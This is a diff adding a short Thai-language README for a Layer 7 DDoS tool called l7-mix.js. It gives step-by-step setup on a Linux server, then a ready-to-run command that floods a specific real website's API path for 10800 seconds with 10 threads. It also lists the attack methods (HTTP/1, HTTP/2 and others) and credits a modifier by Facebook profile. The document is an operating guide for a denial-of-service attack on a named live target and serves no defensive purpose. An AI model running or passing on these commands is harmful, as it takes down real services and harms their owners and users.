@@ -1,0 +1,19 @@
+ลงโปรแกรมที่จำเป็นก่อนใช้
+1.รีโมท linux
+2.นำไฟล์ install.pl อัพลงหน้า root ของ linux
+3 พิมคำสั่ง apt install perl
+4 พิมคำสั่ง perl install.pl
+
+
+------------------- Auto Proxy ------------------
+วิธีใช้งาน
+1.รีโมท linux
+2.นำไฟล์ l7-mix.js อัพลงหน้า root ของ linux
+3. พิมพ์คำสั่ง  node l7-mix.js https://m.lnw666.me/api/LNW6/providers 10800 HTTP/1 10 
+เพื่อใช้งาน ddos (กด ctrl+c เพื่อยกเลิก)
+.
+Usage: node l7-mix.js <url> <time> <method> <threads>
+    Methods : [HTTP/1, HTTP/1-TH, HTTP/2, HTTP/2-TH, REQ]
+        Layer7 Scripts version 1.2.1
+        Cr. Modify : Love Donor
+        Facebook : https://www.facebook.com/nattapon.medee.5
